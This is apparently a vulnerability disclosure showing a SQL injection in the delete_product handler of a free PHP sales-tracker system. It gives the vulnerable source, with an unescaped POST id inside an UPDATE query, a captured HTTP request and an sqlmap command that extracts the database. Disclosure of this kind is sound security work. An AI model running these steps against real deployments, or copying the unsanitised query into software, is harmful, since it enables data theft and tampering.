Download sourcecode from https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html

Deploy the system

The sql injection url: http://127.0.0.1/php-sts/classes/Master.php?f=delete_product Vulnerability trigger parameter: id(post parameter)

The http message is 

```
POST /php-sts/classes/Master.php?f=delete_product HTTP/1.1
Host: 172.31.171.96
Content-Length: 619
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://172.31.171.96
Referer: http://172.31.171.96/php-sts/admin/?page=products
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _identity-backend=1416da550bcea012a11350a0ee7d79cf245e88d2bb9d4d2aa1f1074044ab7943a%3A2%3A%7Bi%3A0%3Bs%3A17%3A%22_identity-backend%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22z6lrwixmdNF4VqtkXw6z-3vMZdSdngm2%22%2C2592000%5D%22%3B%7D; PHPSESSID=qj7s632jgajmvubq5d9g49fnnn
Connection: close

id=1
```

sourcecode:

```php
	function delete_product(){
		extract($_POST);
		$del = $this->conn->query("UPDATE `product_list` set `delete_flag` = 1 where id = '{$id}'");
		if($del){
			$resp['status'] = 'success';
			$this->settings->set_flashdata('success'," Product successfully deleted.");
		}else{
			$resp['status'] = 'failed';
			$resp['error'] = $this->conn->error;
		}
		return json_encode($resp);

	}
```

![1](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310230717607.png)

sqlmap -r /mnt/d/web_temp/php-sts/php-sts2.txt -pid --batch --current-db

![2](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310230757824.png)

![3](https://github.com/paiqian/php-sts-vultest/blob/main/static/image-20230310230806574.png)
